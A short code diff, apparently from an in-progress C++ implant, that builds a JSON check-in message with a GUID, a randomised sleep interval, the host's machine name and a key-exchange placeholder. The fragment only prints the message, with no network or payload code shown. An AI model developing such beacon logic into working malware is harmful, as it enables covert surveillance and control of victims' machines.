@@ -40,14 +40,14 @@ int wmain()
     for(size_t i = 0; i < bufCharCount; i++){
         printf("%c", infoBuf[i]);
     }
-
     std::string checkin("{\"guido\": ");
     std::string guid(value, BufferSize);
-    checkin += guid;
-    checkin += ", \"sleep\": ";
     size_t range = 200000; // 100000 + range is the maximum value you allow
     size_t number = 100000 + (rand() * range) / RAND_MAX;
-
+    std::string sleepTimer = std::to_string(number);
+    std::string mName(infoBuf, bufCharCount);
+    checkin = checkin + guid + ", \"sleep\": " + sleepTimer + ", \"machinename\": " + mName + ", \"DHKeys\": Nada}";
+    std::cout << checkin << std::endl;
     //checkin += ", \"sleepTime\": "; //, \"sleepTime\": 33, \"computerName\": itsme, \"DHKEY\": nada}";
     //checkin += number;
     
